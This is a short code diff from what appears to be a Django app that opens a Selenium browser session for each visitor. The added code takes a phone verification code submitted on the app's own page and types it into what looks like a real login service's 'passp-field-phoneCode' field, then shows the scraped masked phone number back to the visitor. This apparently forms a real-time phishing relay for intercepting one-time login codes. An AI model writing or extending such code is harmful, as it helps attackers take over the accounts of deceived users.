@@ -143,10 +143,10 @@ async def index(request):
 # Create New driver Selenium for New User
 def create_selenium_driver():
     options = Options()
-    options.add_argument('--no-sandbox')
-    options.add_argument('--window-size=1420,1080')
-    options.add_argument('--headless')
-    options.add_argument('--disable-gpu')
+    # options.add_argument('--no-sandbox')
+    # options.add_argument('--window-size=1420,1080')
+    # options.add_argument('--headless')
+    # options.add_argument('--disable-gpu')
     options.add_experimental_option("detach", True)
     driver = webdriver.Chrome(executable_path="/usr/local/bin/chromedriver", chrome_options=options)
 
@@ -154,9 +154,13 @@ def create_selenium_driver():
 
 async def verification(request):
     client_ip = request.META.get('REMOTE_ADDR')
-
     try:
         driver = await get_driver(request, client_ip)
+
+        if request.POST.get('phoneCode',None) :
+            code =request.POST.get('phoneCode',None)
+            driver.find_element(By.ID,"passp-field-phoneCode").send_keys(code)
+            logging.warning(f"WTFF")
         phone_number = driver.find_element(By.CLASS_NAME, "passp-phone-template").text
         return await sync_to_async(render)(request, 'verification.html',
                                            {'phone_number': phone_number})
